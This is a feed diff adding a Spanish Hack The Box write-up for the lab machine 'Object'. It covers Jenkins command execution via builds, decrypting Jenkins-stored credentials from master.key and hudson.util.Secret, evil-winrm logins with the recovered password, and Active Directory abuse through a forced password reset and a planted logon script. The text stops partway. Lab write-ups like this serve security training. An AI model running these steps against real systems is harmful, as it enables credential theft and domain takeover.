@@ -5,9 +5,512 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 17 Oct 2023 00:28:45 -0500</pubDate>
-    <lastBuildDate>Tue, 17 Oct 2023 00:28:45 -0500</lastBuildDate>
+    <pubDate>Thu, 26 Oct 2023 23:08:45 -0500</pubDate>
+    <lastBuildDate>Thu, 26 Oct 2023 23:08:45 -0500</lastBuildDate>
     <generator>Jekyll v4.3.2</generator>
+    
+      <item>
+        <title>Maquina Object - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Oject&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad &lt;code&gt;dificil&lt;/code&gt;, esta vez nos enfrentamos a un &lt;code&gt;jenkyll&lt;/code&gt; el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del &lt;code&gt;jenkins&lt;/code&gt; para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con &lt;code&gt;bloodhound&lt;/code&gt;, abusaremos del permiso de &lt;code&gt;ForceChangedPassword&lt;/code&gt; para cambiar la contraseña de un usuario y una vez como este aprovecharnos de &lt;code&gt;GenericWrite&lt;/code&gt; para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio &lt;code&gt;WriteOwner&lt;/code&gt; asigarnos el privilegio de &lt;code&gt;DomainAdmins&lt;/code&gt; y asi obtener acceso completo al sistema.&lt;/p&gt;
+
+&lt;p&gt;Maquina bastante interesante.&lt;/p&gt;
+
+&lt;p&gt;Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Object
+❯ ls
+
+ Object
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.11.132
+PING 10.10.11.132 (10.10.11.132) 56(84) bytes of data.
+64 bytes from 10.10.11.132: icmp_seq=1 ttl=127 time=143 ms
+
+--- 10.10.11.132 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 143.382/143.382/143.382/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.132 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 17:58 -05
+Initiating SYN Stealth Scan at 17:58
+Scanning 10.10.11.132 [65535 ports]
+Discovered open port 80/tcp on 10.10.11.132
+Discovered open port 8080/tcp on 10.10.11.132
+Discovered open port 5985/tcp on 10.10.11.132
+Completed SYN Stealth Scan at 17:58, 26.99s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.132
+Host is up, received user-set (0.20s latency).
+Scanned at 2023-10-26 17:58:21 -05 for 27s
+Not shown: 65532 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    REASON
+80/tcp   open  http       syn-ack ttl 127
+5985/tcp open  wsman      syn-ack ttl 127
+8080/tcp open  http-proxy syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 27.10 seconds
+           Raw packets sent: 131085 (5.768MB) | Rcvd: 22 (968B)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80,5985,8080 10.10.11.132 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 18:00 -05
+Nmap scan report for 10.10.11.132
+Host is up (0.25s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Mega Engines
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8080/tcp open  http    Jetty 9.4.43.v20210629
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+|_http-server-header: Jetty(9.4.43.v20210629)
+| http-robots.txt: 1 disallowed entry 
+|_/
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Microsoft IIS httpd 10.0&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8080&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Jetty 9.4.43.v20210629&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5985&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;WINRM&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Como vemos que los puertos &lt;code&gt;80&lt;/code&gt; y &lt;code&gt;8080&lt;/code&gt; corresponde a un servicio web con &lt;code&gt;whatweb&lt;/code&gt; vamos a tratar de enumerar las tecnolologias que emplean.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.11.132
+http://10.10.11.132 [200 OK] Country[RESERVED][ZZ], Email[ideas@object.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.132], JQuery[2.1.3], Microsoft-IIS[10.0], Modernizr, Script, Title[Mega Engines]
+❯ whatweb http://10.10.11.132:8080
+http://10.10.11.132:8080 [403 Forbidden] Cookies[JSESSIONID.c4a63e7b], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.c4a63e7b], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
+http://10.10.11.132:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.c4a63e7b], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.c4a63e7b], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que nos enfrentamos a un &lt;code&gt;IIS&lt;/code&gt; y en el puerto &lt;code&gt;8080&lt;/code&gt; a un &lt;code&gt;jenkyll&lt;/code&gt;, asi que vamos a proceder a abrirnos el servicio en nuestro navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos la opcion de crear cuenta, asi vamos a proceder a registrarnos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez creamos nuestra cuenta, nos redirigimos a un panel de usuario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro podemos crear un proyecto al cual llamare &lt;code&gt;test&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tendremos una serie de opciones como agregar un nombre.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y en la parte de &lt;code&gt;build triggers&lt;/code&gt;, seleccionar que se ejecute periodicamente y configurar la ejecución cada minuto como si fuera una tarea cron.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Despues en &lt;code&gt;build&lt;/code&gt; seleccionar ejecutar comando de windows.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui agregaremos el comando que deseamos ejecutar, Aplicamos los cambios y guardamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pasado un minuto vemos en nuestro &lt;code&gt;build history&lt;/code&gt; vemos dos compilaciones.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Seleccionamos cualquiera y en &lt;code&gt;console output&lt;/code&gt; vemos que se ejecuto el comando correctamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Otra forma mas comoda en la que podemos ejecutar comandos es a traves de la creación de un token, esto podemos hacerlo en la configuración de nuestro perfil.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora en la configuración de nuestro proyecto debemos indicarle esta vez en lanzar ejecuciones remotas y ahora a esa &lt;code&gt;url&lt;/code&gt; generada debemos de tramitarle una petición con la autenticacion requerida, donde debemos indicarle nuestro usuario y el token.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta vez trataremos de ejecutar otro comando para listar el directorio actual.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lanzamos la petición con &lt;code&gt;curl&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://fmiracle:1120abc86ec7661ac09d63349eb055baff@10.10.11.132:8080/job/test/build?token=myToken&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Recargamos la pagina y vemos que se genero otro build.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Seleccionamos el nuevo build y vemos que el codigo se ejecuto correctamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora podriamos tratar de ganar acceso al sistema a traves de una conexión por &lt;code&gt;tcp o udp&lt;/code&gt; a nuestra maquina, pero si hacemos el mismo proceso y ejecutamos esta sentencia en &lt;code&gt;powershell&lt;/code&gt; podemos ver mediante las reglas de firewall que unicamente tenemos permitido el &lt;code&gt;icmp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vimos anteriormente que listando el directorio existia uno llamado &lt;code&gt;.jenkys&lt;/code&gt;, asi que vamos a listar los recursos dentro de este, esto lo logramos ejecutando los mismos pasos anteriores.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos los directorios &lt;code&gt;users&lt;/code&gt; y &lt;code&gt;secrets&lt;/code&gt; y si lo listamos vemos los usuarios existentes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si listamos ahora lo que hay en &lt;code&gt;admin&lt;/code&gt;, encontramos un archivo &lt;code&gt;config.xml&lt;/code&gt;, que si lo leemos vemos la contraseña del usuario encryptada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta contraseña podemos tratar de desencriptarla, pero para ello vamos a necesitar los archivos del directorio &lt;code&gt;secrets&lt;/code&gt; los archivos &lt;code&gt;master.key&lt;/code&gt; y &lt;code&gt;hudson.util.secret&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Primero vamos a copiarnos el &lt;code&gt;master.key&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No olvidemos que hay quitar el salto de linea para que no de problemas.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat master.key| tr -d '\n' | sponge master.key
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora nos copiaremos el &lt;code&gt;hudson&lt;/code&gt; pero debido a que este no es legible primero lo vamos a convertir a &lt;code&gt;base64&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/obje24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que tenemos los 3 archivos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
+ config.xml   hudson.util.Secret   master.key
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vamos a utilizar la herramienta del repositorio de &lt;code&gt;hoto&lt;/code&gt;:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/hoto/jenkins-credentials-decryptor&quot;&gt;jenkins-credentials-decryptor&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Solo debes ejecutar este comando para tenerla.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -L \
+  &quot;https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)&quot; \
+   -o jenkins-credentials-decryptor
+
+chmod +x jenkins-credentials-decryptor
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos con los parametros correspondientes, indicando cada archivo y obtenemos la contraseña en texto claro.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ./jenkins-credentials-decryptor -c config.xml -m master.key -s hudson.util.Secret
+[
+  {
+    &quot;id&quot;: &quot;320a60b9-1e5c-4399-8afe-44466c9cde9e&quot;,
+    &quot;password&quot;: &quot;c1cdfun_d2434\u0003\u0003\u0003&quot;,
+    &quot;username&quot;: &quot;oliver&quot;
+  }
+]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora que el servicio de &lt;code&gt;winrm&lt;/code&gt; esta activo, podemos conectarnos usando estas credenciales al equipo y obtenemos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\oliver\Documents&amp;gt; whoami
+object\oliver
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/rt.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Vamos a utilizar &lt;code&gt;sharphound&lt;/code&gt; para enumerar el sistema y visualizar los resultados en &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;SharpHound.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Subimos el &lt;code&gt;sharphound&lt;/code&gt; al equipo importandolo directamente con &lt;code&gt;Iex&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; upload /home/fmiracle/machines/Oject/content/SharpHound.ps1
+                                        
+Info: Uploading /home/fmiracle/machines/Oject/content/SharpHound.ps1 to C:\Windows\Temp\Privesc\SharpHound.ps1
+                                        
+Data: 1297764 bytes of 1297764 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; Import-Module .\SharpHound.ps1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos transferimos el comprimido y lo abrimos en &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; download C:\Windows\Temp\Privesc\20231026165356_BloodHound.zip
+                                        
+Info: Downloading C:\Windows\Temp\Privesc\20231026165356_BloodHound.zip to 20231026165356_BloodHound.zip
+                                        
+Info: Download successful!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos que el usuario &lt;code&gt;oliver&lt;/code&gt; tenemos el permiso de &lt;code&gt;ForceChangedPassword&lt;/code&gt; sobre &lt;code&gt;smith&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si vamos a la opción &lt;code&gt;abuse info&lt;/code&gt;, vemos una manera de poder aprovecharnos de este privilegio, para ello primero debemos generar una contraseña en formato &lt;code&gt;SecureString&lt;/code&gt; y ejecutar &lt;code&gt;Set-DomainUserPassword&lt;/code&gt; que es una función de &lt;code&gt;Powerview.ps1&lt;/code&gt; asi que primero debemos descargarnos el script e importarnos el modulo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerView.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; Set-DomainUserPassword -Identity smith -AccountPassword $secPassword
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Validamos y nos conectamos exitosamente como &lt;code&gt;smith&lt;/code&gt; con la credencial que definimos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.11.132 -u 'smith' -p 'Password123!'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora que somo &lt;code&gt;smith&lt;/code&gt; vamos a marcarlo como &lt;code&gt;Owned&lt;/code&gt; y veamos con que permisos cuenta este nuevo usuario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que este nuevo usuario tiene el privilegio de &lt;code&gt;GenericWrite&lt;/code&gt; sobre &lt;code&gt;maria&lt;/code&gt;, y si vamos a &lt;code&gt;abuse info&lt;/code&gt; nos dice que podemos tratar de ejecutar un &lt;code&gt;kerberoasting attack&lt;/code&gt;, pero si lo tratamos de realizar no podremos crackear la contraseña debido a que la contraseña del usuario &lt;code&gt;maria&lt;/code&gt; es bastante robusta.&lt;/p&gt;
+
+&lt;p&gt;Pero dado que con este privilegio podemos modificar los atributos de un usuario, vamos a tratar de aprovecharnos de este privilegio asignando un script de inicio de sesión al perfil de maria, de este modo cada vez que inicie sesión puedo hacer que ejecute un script que podemos definirnos.&lt;/p&gt;
+
+&lt;p&gt;Pero para ello debemos de usar la función &lt;code&gt;Set-DomainObject&lt;/code&gt; que se encuentra en &lt;code&gt;PowerView.ps1&lt;/code&gt;, asi que vamos a volver a importarlo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Import-Module .\PowerView.ps1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Despues vamos a crear un script &lt;code&gt;test.ps1&lt;/code&gt; que copie todos los archivos del escritorio de &lt;code&gt;maria&lt;/code&gt; a mi ruta actual.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; echo &quot;copy C:\Users\Maria\Desktop\* C:\ProgramData\Privesc\&quot; &amp;gt; test.ps1
+*Evil-WinRM* PS C:\ProgramData\Privesc&amp;gt; Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\Privesc\test.ps1'}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Listamos los archivos y vemos un archivo &lt;code&gt;Engine.xsl&lt;/code&gt; que vamos a traernos a nuestro equipo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Abrimos el archivo con &lt;code&gt;libreoffice&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
+ 20231026165356_BloodHound.zip   config.xml   credentials.txt   Engines.xls   hudson.util.Secret   jenkins-credentials-decryptor   master.key   PowerView.ps1   SharpHound.ps1
+❯ libreoffice Engines.xls
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Object/ob7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
